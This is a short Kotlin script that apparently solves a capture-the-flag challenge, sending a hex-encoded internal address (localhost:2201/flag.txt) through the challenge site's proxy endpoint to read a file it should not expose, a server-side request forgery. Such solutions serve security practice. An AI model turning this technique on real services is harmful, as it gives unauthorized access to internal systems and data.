import okhttp3.OkHttpClient
import okhttp3.Request

fun main(args: Array<String>) {
    val url = "http://editor.tghack.no"
    val proxydURL = "http://localhost:2201/flag.txt"
    val hexEncoded = proxydURL.toByteArray(Charsets.UTF_8)
            .map { String.format("%x", it) }
            .joinToString("")
    val request = Request.Builder()
            .url("$url/proxy/$hexEncoded")
            .get()
            .build()
    val client = OkHttpClient()
    val response = client.newCall(request).execute()
    println(response.body()?.string() ?: "No response body")
}